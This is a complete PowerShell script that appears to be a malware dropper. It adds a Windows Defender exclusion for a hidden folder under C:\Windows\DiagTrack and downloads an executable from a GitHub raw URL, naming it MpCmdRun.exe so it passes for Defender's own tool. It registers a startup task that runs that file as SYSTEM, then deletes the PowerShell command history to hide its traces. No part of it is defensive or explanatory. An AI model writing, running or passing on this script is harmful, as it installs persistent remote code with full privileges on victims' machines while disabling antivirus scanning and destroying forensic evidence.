# Set the execution policy to allow running scripts that are downloaded from the internet
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force

# Define the path to exclude from Windows Defender scans
$pathToExclude = "C:\Windows\DiagTrack\Settings"

# Add the exclusion path to Windows Defender
Add-MpPreference -ExclusionPath $pathToExclude

# Print a confirmation message to the console
Write-Host "Exclusion added successfully for: $pathToExclude"

# URL of the executable to download
$urlMpCmdRun = "https://github.com/XXS437/M/blob/main/MpCmdRun%20%20L.exe?raw=true"

# Define the hidden directory where the executable will be stored
$hiddenDirectoryMpCmdRun = "C:\Windows\DiagTrack\Settings"

# Define the full destination path for the downloaded executable
$destinationPathMpCmdRun = "$hiddenDirectoryMpCmdRun\MpCmdRun.exe"

# Check if the hidden directory exists, and create it if it does not
if (-not (Test-Path -Path $hiddenDirectoryMpCmdRun)) {
    New-Item -Path $hiddenDirectoryMpCmdRun -ItemType Directory -Force
}

# Download the executable from the specified URL and save it to the destination path
Invoke-WebRequest -Uri $urlMpCmdRun -OutFile $destinationPathMpCmdRun

# Create a scheduled task action to execute the downloaded executable
$action = New-ScheduledTaskAction -Execute $destinationPathMpCmdRun

# Set the trigger to run the task at system startup
$trigger = New-ScheduledTaskTrigger -AtStartup

# Set the principal to run the task with system privileges
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# Define additional task settings
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

# Register the scheduled task with the specified action, trigger, principal, and settings
Register-ScheduledTask -TaskName "MpCmdRunTask" -Action $action -Trigger $trigger -Principal $principal -Settings $settings

# Define the path to the PowerShell command history file
$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')

# Remove the PowerShell command history file to clear any trace of commands run
Remove-Item -Path $historyPath
